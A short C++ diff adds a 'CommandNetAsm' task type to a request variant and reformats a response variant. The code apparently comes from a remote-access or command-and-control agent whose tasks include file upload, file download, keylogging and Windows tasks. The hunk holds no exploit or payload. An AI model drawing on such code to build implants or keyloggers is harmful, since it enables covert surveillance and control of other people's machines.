@@ -209,12 +209,10 @@ using Request = std::variant<
     TaskRequest<CommandUploadFile>,
     TaskRequest<CommandDownloadFile>,
     TaskRequest<CommandKeylogger>,
-    TaskRequest<CommandWinTask>,
+    TaskRequest<CommandWinTask>,    
+    TaskRequest<CommandNetAsm>, 
     TaskRequest<bool>>;
-
-using Response = std::variant<
-    TaskResponse<TaskSuccess>,
-    TaskResponse<TaskError>>;
+using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
 
 inline std::string CreateResponseTaskValue(
     const std::deque<Response>& tasks)
